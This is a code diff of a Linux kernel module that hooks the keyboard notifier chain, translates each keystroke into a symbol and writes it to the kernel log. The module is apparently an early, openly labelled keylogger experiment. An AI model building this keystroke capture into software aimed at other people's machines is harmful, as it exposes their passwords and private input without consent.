@@ -2,21 +2,27 @@
 #include <linux/module.h>
 
 #include <linux/keyboard.h>
+#include "headers/keysym.h"
 
-int kbd_listener(struct notifier_block *, unsigned long, void *);
+int kstroke_handler(struct notifier_block *, unsigned long, void *);
 
 //notifier block for kbd_listener
-struct notifier_block nb = {
-  .notifier_call = kbd_listener
+static struct notifier_block nb = {
+  .notifier_call = kstroke_handler
 };
+
+//buffer for translated key symbols
+static char trans[16];
 
 /*Called when a key is pressed.
  *No, I don't know what the parameters are/do.
  */
-int kbd_listener(struct notifier_block *nb, unsigned long num, void *ptr) {
-  //printk(KERN_ALERT "Notified!\n");
-  struct keyboard_notifier_param *keystroke_data = ptr;
-  unsigned int val = keystroke_data->value;
+int kstroke_handler(struct notifier_block *nb,
+                    unsigned long num, void *param) {
+
+  struct keyboard_notifier_param *keystroke = param;
+  unsigned short sym = keystroke->value;
+  unsigned int flag = keystroke->down;
 
   switch (num) {
     case KBD_KEYCODE :
@@ -26,11 +32,12 @@ int kbd_listener(struct notifier_block *nb, unsigned long num, void *ptr) {
     case KBD_UNICODE :
       printk(KERN_ALERT "Unicode?\n"); break;
     case KBD_KEYSYM :
-      printk(KERN_ALERT "Keysym  : %x\n", keystroke_data->value);
-      printk(KERN_ALERT "          %x,%x\n", KTYP(val), KVAL(val)); break;
+      printk(KERN_ALERT "Keysym  : %x\n", keystroke->ledstate);
+      break;
     case KBD_POST_KEYSYM :
-      printk(KERN_ALERT "Post KS : %x\n", keystroke_data->value);
-      printk(KERN_ALERT "          %x,%x\n", KTYP(val), KVAL(val)); break;
+      xlate_keysym(sym, flag, trans);
+      printk(KERN_ALERT "Post KS : %s\n", trans);
+      break;
     default :
       printk(KERN_ALERT "Really not sure what happend\n"); break;
   }
